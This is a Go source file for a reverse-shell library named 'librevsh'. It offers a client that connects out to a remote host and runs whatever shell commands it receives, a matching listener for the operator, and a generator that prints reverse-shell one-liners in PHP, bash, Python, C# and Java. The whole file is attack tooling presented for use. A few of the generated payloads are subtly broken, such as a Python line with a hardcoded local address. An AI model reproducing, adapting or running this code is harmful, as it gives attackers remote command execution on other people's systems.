package librevsh

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"text/template"
)
func ReverseShell(server string, port string) {
	conn, err := net.Dial("tcp", server+":"+port)
	if err != nil {
		log.Fatalf("Error connecting to server: %v", err)
	}
	defer conn.Close()

	fmt.Printf("Connected to server %s:%s\n", server, port)

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	for {
		// Read the command from the server
		message, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Error reading from server: %v", err)
			break
		}
		message = strings.TrimSpace(message)

		if message == "exit" {
			fmt.Println("Exiting...")
			break
		}

		// Execute the command
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd.exe", "/C", message)
		} else {
			cmd = exec.Command("/bin/sh", "-c", message)
		}

		// Capture the output
		output, err := cmd.CombinedOutput()
		if err != nil {
			writer.WriteString(fmt.Sprintf("Error: %s\n", err.Error()))
		} else {
			writer.WriteString(string(output))
		}
		writer.Flush()
	}
}

func ServerMode(port string) {
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		log.Fatalf("Error starting server: %v", err)
	}
	defer ln.Close()

	fmt.Printf("Server listening on port %s...\n", port)

	conn, err := ln.Accept()
	if err != nil {
		log.Fatalf("Error accepting connection: %v", err)
	}
	defer conn.Close()

	fmt.Printf("Client connected: %s\n", conn.RemoteAddr().String())

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)
	inputReader := bufio.NewReader(os.Stdin)

	for {
		// Get the command from the server-side user
		fmt.Print("Shell> ")
		command, _ := inputReader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "exit" {
			writer.WriteString("exit\n")
			writer.Flush()
			break
		}

		// Send the command to the client
		writer.WriteString(command + "\n")
		writer.Flush()

		// Read the response from the client
		response, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Error reading response: %v", err)
			break
		}

		fmt.Print(response)
	}
}


// ReverseShellScript generates reverse shell scripts in different languages
func ReverseShellScript(language, ip, port string) {
	scripts := map[string]string{
		"php": `<?php $os=strtoupper(substr(PHP_OS, 0, 3));$sock=fsockopen("{{.IP}}",{{.Port}});if($os==='WIN'){pclose(popen("cmd.exe /c ".$sock, "r"));}else{exec("/bin/sh -i <&3 >&3 2>&3");} ?>`,
	
		"bash": `bash -c 'if [ "$(uname)" = "Linux" ] || [ "$(uname)" = "Darwin" ]; then bash -i >& /dev/tcp/{{.IP}}/{{.Port}} 0>&1; fi'`,
	
		"python": `import socket,subprocess,os,platform;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9999));[subprocess.Popen(s.recv(1024).decode("utf-8"),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE).communicate() for _ in iter(int,1)] if platform.system()=="Windows" else [os.dup2(s.fileno(),fd) for fd in (0,1,2)] or subprocess.call(["/bin/sh","-i"])`,
	
		"c#": `using System;using System.Net.Sockets;using System.IO;using System.Diagnostics;class Program{static void Main(){TcpClient c=new TcpClient("{{.IP}}",{{.Port}});Stream s=c.GetStream();StreamReader r=new StreamReader(s);StreamWriter w=new StreamWriter(s);w.AutoFlush=true;string o=Environment.OSVersion.Platform.ToString();while((o=r.ReadLine())!=null){Process p=new Process();p.StartInfo.FileName=(o.Contains("Win")?"cmd.exe":"/bin/sh");p.StartInfo.Arguments=(o.Contains("Win")?"/c "+o:"-i");p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.Start();StreamWriter i=p.StandardInput;StreamReader x=p.StandardOutput;i.WriteLine(o);w.WriteLine(x.ReadToEnd());}}}`,
	
		"java": `import java.io.*;import java.net.*;public class ReverseShell{public static void main(String[] args){try{Socket s=new Socket("{{.IP}}",{{.Port}});Process p=(System.getProperty("os.name").toLowerCase().contains("win")?new ProcessBuilder("cmd.exe"):new ProcessBuilder("/bin/sh")).redirectErrorStream(true).start();InputStream pi=p.getInputStream(),pe=p.getErrorStream();OutputStream ps=p.getOutputStream();OutputStream so=s.getOutputStream();InputStream si=s.getInputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)ps.write(si.read());so.flush();ps.flush();Thread.sleep(50);}}catch(Exception e){e.printStackTrace();}}}`,
	}
	
	

	script, ok := scripts[language]
	if !ok {
		fmt.Printf("Unsupported language: %s\n", language)
		return
	}

	tmpl, err := template.New("reverse-shell").Parse(script)
	if err != nil {
		log.Fatalf("Error parsing script template: %v", err)
	}

	data := struct {
		IP   string
		Port string
	}{
		IP:   ip,
		Port: port,
	}

	err = tmpl.Execute(os.Stdout, data)
	if err != nil {
		log.Fatalf("Error generating script: %v", err)
	}
}